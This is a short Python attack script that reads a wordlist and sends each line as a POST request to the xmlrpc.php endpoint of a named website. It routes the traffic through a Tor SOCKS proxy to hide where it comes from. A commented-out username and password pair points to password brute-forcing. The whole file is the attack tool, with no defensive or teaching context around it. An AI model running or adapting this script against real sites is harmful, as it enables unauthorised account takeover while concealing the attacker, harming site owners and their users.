import requests
import socket
import string 
import sys
import threading

wordlist = sys.argv[1]     # SET CUSTOM WORDLIS
        
     
     
proxiesdef = {
    'http': 'socks5://localhost:9050',
    'https': 'socks5://localhost:9050'
}


with open(wordlist, 'r') as f:
     for line in f.read().splitlines():
        passwds = line
        print(line)
        r =requests.post('http://macaxeirateste.tk/xmlrpc.php', line, proxies=proxiesdef)
        print(r.text)
     else: 
        print("Finished")
     
    
#data = {'username':'Olivia','password':'123'}

